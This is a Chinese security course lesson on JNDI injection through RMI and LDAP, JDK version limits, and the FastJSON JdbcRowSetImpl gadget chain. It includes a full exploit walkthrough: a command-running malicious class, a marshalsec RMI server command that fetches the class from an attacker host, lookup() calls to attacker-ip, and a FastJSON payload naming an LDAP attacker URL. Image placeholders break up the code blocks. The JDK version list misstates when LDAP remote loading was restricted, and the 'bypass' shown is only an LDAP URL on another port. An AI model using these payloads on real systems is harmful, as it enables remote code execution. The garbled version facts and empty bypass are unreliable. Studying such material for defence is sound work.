# 🚀 课程 P37：JavaEE应用与JNDI注入、RMI服务、LDAP服务、JDK绕过及调用链类

![](img/9b28d368abfb9a24f122907b3553fbc7_1.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_3.png)

在本节课中，我们将要学习JavaEE应用中的JNDI注入、RMI服务、LDAP服务、JDK版本绕过以及相关的调用链类。我们将从基础概念入手，逐步深入到实际利用场景，帮助初学者理解这些复杂的安全概念。

![](img/9b28d368abfb9a24f122907b3553fbc7_5.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_6.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_8.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_10.png)

## 📚 概述：什么是JNDI？

![](img/9b28d368abfb9a24f122907b3553fbc7_12.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_14.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_16.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_18.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_20.png)

JNDI全称为Java Naming and Directory Interface，即Java命名和目录接口。它是一个内置的接口，用于实现对象和服务的调用。JNDI支持多种服务，包括RMI、LDAP、CORBA和DNS等。简单来说，JNDI允许Java应用程序通过统一的接口访问各种命名和目录服务。

![](img/9b28d368abfb9a24f122907b3553fbc7_22.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_24.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_26.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_28.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_30.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_32.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_34.png)

在安全领域，JNDI注入是一种常见的安全攻击手段。攻击者可以利用JNDI接口，远程调用恶意的Java代码，从而实现命令执行等攻击。

![](img/9b28d368abfb9a24f122907b3553fbc7_36.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_38.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_40.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_42.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_44.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_46.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_48.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_50.png)

## 🔍 JNDI注入的基本原理

![](img/9b28d368abfb9a24f122907b3553fbc7_52.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_54.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_56.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_58.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_60.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_62.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_64.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_66.png)

JNDI注入的核心在于`javax.naming.InitialContext.lookup()`方法。该方法用于查找和调用远程或本地的对象和服务。如果攻击者能够控制`lookup()`方法的参数，就可以指向恶意的RMI或LDAP服务，从而触发远程代码执行。

![](img/9b28d368abfb9a24f122907b3553fbc7_68.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_70.png)

以下是JNDI注入的基本代码示例：

![](img/9b28d368abfb9a24f122907b3553fbc7_72.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_74.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_76.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_78.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_80.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_82.png)

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

![](img/9b28d368abfb9a24f122907b3553fbc7_84.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_86.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_88.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_90.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_92.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_94.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_96.png)

public class JNDIDemo {
    public static void main(String[] args) throws NamingException {
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://attacker-ip:1099/恶意对象");
    }
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_98.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_100.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_102.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_104.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_106.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_108.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_110.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_112.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_114.png)

这段代码通过`InitialContext.lookup()`方法调用了一个RMI服务。如果RMI服务指向恶意的Java类，就会触发远程代码执行。

![](img/9b28d368abfb9a24f122907b3553fbc7_116.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_118.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_120.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_122.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_124.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_126.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_127.png)

## 🛠️ RMI与LDAP服务

![](img/9b28d368abfb9a24f122907b3553fbc7_129.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_131.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_133.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_135.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_137.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_139.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_141.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_143.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_145.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_146.png)

RMI（Remote Method Invocation）和LDAP（Lightweight Directory Access Protocol）是JNDI支持的两种主要服务。它们都可以用于远程调用Java对象，但在协议和用途上有所不同。

![](img/9b28d368abfb9a24f122907b3553fbc7_148.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_150.png)

### RMI服务
RMI是Java的远程方法调用协议，默认端口为1099。它允许一个Java虚拟机上的对象调用另一个Java虚拟机上的对象。在JNDI注入中，RMI常用于远程加载和执行恶意的Java类。

![](img/9b28d368abfb9a24f122907b3553fbc7_152.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_154.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_156.png)

### LDAP服务
LDAP是轻量级目录访问协议，默认端口为389。它主要用于访问和维护分布式目录信息服务。在JNDI注入中，LDAP也可以用于远程加载和执行Java类。

![](img/9b28d368abfb9a24f122907b3553fbc7_158.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_160.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_162.png)

以下是使用RMI和LDAP服务的示例：

![](img/9b28d368abfb9a24f122907b3553fbc7_164.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_166.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_168.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_170.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_172.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_174.png)

```java
// RMI示例
ctx.lookup("rmi://attacker-ip:1099/恶意对象");

![](img/9b28d368abfb9a24f122907b3553fbc7_176.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_178.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_180.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_182.png)

// LDAP示例
ctx.lookup("ldap://attacker-ip:389/恶意对象");
```

![](img/9b28d368abfb9a24f122907b3553fbc7_184.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_186.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_188.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_190.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_192.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_194.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_196.png)

## 🧪 实验：JNDI注入的实际利用

![](img/9b28d368abfb9a24f122907b3553fbc7_198.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_200.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_202.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_204.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_206.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_208.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_210.png)

为了帮助大家更好地理解JNDI注入，我们将通过一个简单的实验来演示其利用过程。实验步骤如下：

![](img/9b28d368abfb9a24f122907b3553fbc7_212.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_214.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_216.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_218.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_220.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_222.png)

1. **编译恶意Java类**：编写一个执行命令的Java类，并将其编译为class文件。
2. **启动恶意RMI/LDAP服务**：使用工具启动一个RMI或LDAP服务，指向恶意class文件。
3. **触发JNDI注入**：在目标应用中调用`lookup()`方法，指向恶意服务。

![](img/9b28d368abfb9a24f122907b3553fbc7_224.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_226.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_228.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_230.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_232.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_234.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_236.png)

以下是实验的具体步骤：

![](img/9b28d368abfb9a24f122907b3553fbc7_238.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_240.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_242.png)

### 步骤1：编译恶意Java类
编写一个简单的Java类，用于执行系统命令：

![](img/9b28d368abfb9a24f122907b3553fbc7_244.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_246.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_248.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_250.png)

```java
public class MaliciousClass {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_252.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_254.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_256.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_258.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_259.png)

使用`javac`命令编译该类：
```bash
javac MaliciousClass.java
```

![](img/9b28d368abfb9a24f122907b3553fbc7_261.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_263.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_265.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_267.png)

### 步骤2：启动恶意RMI服务
使用工具（如`marshalsec`）启动一个RMI服务，指向恶意class文件：
```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker-ip:8000/#MaliciousClass" 1099
```

![](img/9b28d368abfb9a24f122907b3553fbc7_269.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_271.png)

### 步骤3：触发JNDI注入
在目标应用中调用`lookup()`方法：
```java
InitialContext ctx = new InitialContext();
ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
```

![](img/9b28d368abfb9a24f122907b3553fbc7_273.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_275.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_277.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_279.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_281.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_283.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_285.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_287.png)

执行上述代码后，目标系统会弹出计算器，证明JNDI注入成功。

![](img/9b28d368abfb9a24f122907b3553fbc7_289.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_291.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_293.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_295.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_297.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_299.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_301.png)

## 🛡️ JDK版本绕过

![](img/9b28d368abfb9a24f122907b3553fbc7_303.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_305.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_307.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_309.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_311.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_313.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_315.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_317.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_319.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_321.png)

随着JDK版本的更新，JNDI注入的利用受到了一定的限制。例如，高版本的JDK默认禁用了RMI和LDAP的远程类加载功能。以下是JDK版本对JNDI注入的影响：

![](img/9b28d368abfb9a24f122907b3553fbc7_323.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_325.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_327.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_329.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_331.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_333.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_335.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_337.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_339.png)

- **JDK 6u141、7u131、8u121之前**：RMI和LDAP均可用于JNDI注入。
- **JDK 8u191之后**：RMI的远程类加载被禁用，但LDAP仍可绕过。
- **JDK 11.0.1之后**：LDAP的远程类加载也被禁用。

![](img/9b28d368abfb9a24f122907b3553fbc7_341.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_343.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_345.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_347.png)

为了绕过这些限制，攻击者通常会使用一些技巧，例如利用本地类加载或结合其他漏洞。以下是一个绕过JDK限制的示例：

![](img/9b28d368abfb9a24f122907b3553fbc7_349.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_351.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_353.png)

```java
// 使用LDAP绕过JDK限制
ctx.lookup("ldap://attacker-ip:1386/恶意对象");
```

## 🔗 调用链类

![](img/9b28d368abfb9a24f122907b3553fbc7_355.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_357.png)

在实际的Java应用中，JNDI注入通常与其他漏洞结合使用，形成调用链。例如，FastJSON反序列化漏洞中，攻击者可以通过JNDI注入实现远程代码执行。

![](img/9b28d368abfb9a24f122907b3553fbc7_359.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_361.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_363.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_365.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_367.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_369.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_371.png)

以下是FastJSON漏洞中JNDI注入的示例：

![](img/9b28d368abfb9a24f122907b3553fbc7_373.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_375.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_377.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_379.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_381.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_382.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_384.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_386.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_388.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_390.png)

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker-ip:1389/恶意对象",
    "autoCommit": true
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_392.png)

在这个示例中，`JdbcRowSetImpl`类会调用`lookup()`方法，从而触发JNDI注入。

![](img/9b28d368abfb9a24f122907b3553fbc7_394.png)

## 📝 总结

![](img/9b28d368abfb9a24f122907b3553fbc7_396.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_397.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_399.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_401.png)

本节课中我们一起学习了JNDI注入的基本原理、RMI与LDAP服务的使用、JDK版本绕过以及调用链类的实际应用。以下是本节课的核心知识点：

![](img/9b28d368abfb9a24f122907b3553fbc7_403.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_405.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_407.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_409.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_411.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_413.png)

1. **JNDI是什么**：Java命名和目录接口，用于远程调用对象和服务。
2. **JNDI注入的原理**：通过`InitialContext.lookup()`方法调用恶意RMI或LDAP服务。
3. **RMI与LDAP服务**：分别用于远程方法调用和目录访问，均可用于JNDI注入。
4. **JDK版本绕过**：高版本JDK限制了RMI和LDAP的远程类加载，但可通过技巧绕过。
5. **调用链类**：JNDI注入常与其他漏洞结合，形成攻击链。

![](img/9b28d368abfb9a24f122907b3553fbc7_415.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_417.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_419.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_421.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_423.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_425.png)

希望通过本节课的学习，大家能够对JNDI注入有一个初步的了解，并能够在实际应用中识别和防范这类安全风险。